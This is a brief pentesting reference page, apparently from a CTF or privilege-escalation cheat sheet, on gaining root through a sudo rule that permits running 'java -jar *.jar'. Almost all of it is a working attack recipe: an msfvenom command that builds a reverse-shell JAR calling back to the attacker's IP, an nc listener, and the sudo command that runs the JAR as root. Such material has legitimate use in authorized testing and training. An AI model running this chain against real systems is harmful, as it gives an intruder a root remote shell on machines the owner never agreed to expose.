---
title: Sudo Java Privilege Escalation
description: Sudo Java is vulnerable to privilege escalation.
tags:
    - Privilege Escalation
refs:
date: 2023-02-14
draft: false
---

## Investigation

```bash
sudo -l

(root) /usr/bin/java -jar *.jar
```

If we can execute java command with arbitrary **`.jar`** file as root, we can escalate to privileges.

<br />

## Exploitation

### 1. Create a JAR File

First, create a custom jar file in local machine.  
Replace **`<local-ip>`** with your local ip address.

```bash
msfvenom -p java/shell_reverse_tcp LHOST=<local-ip> LPORT=4444 -f jar -o shell.jar
```

Then transfer the file to remote machine.

### 2. Reverse Shell

In local machine, start a listener.

```bash
nc -lvnp 4444
```

Now execute the java command as root in target machine.

```bash
sudo /usr/bin/java -jar /tmp/shell.jar
```

We should get a root shell.